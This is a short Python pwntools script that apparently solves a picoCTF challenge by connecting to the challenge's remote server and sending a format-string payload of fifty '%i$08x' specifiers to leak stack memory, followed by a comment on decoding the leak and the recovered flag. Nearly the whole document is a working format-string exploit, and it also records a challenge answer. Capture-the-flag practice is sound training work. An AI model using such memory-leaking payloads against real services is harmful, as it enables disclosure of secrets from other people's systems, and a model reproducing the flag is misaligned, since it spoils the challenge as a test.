#! /usr/bin/env python3

from pwn import *

elf = ELF("./vuln")
#p = elf.process()
p = remote("mercury.picoctf.net", 6989)
p.sendlineafter("portfolio", "1")

payload = ""

for i in range(50):
    payload += f"%{i}$08x"

p.sendlineafter("token?", payload)
p.interactive()

# find possibles ascii chars and send to cyber chef with a detail swap endianess
# picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}
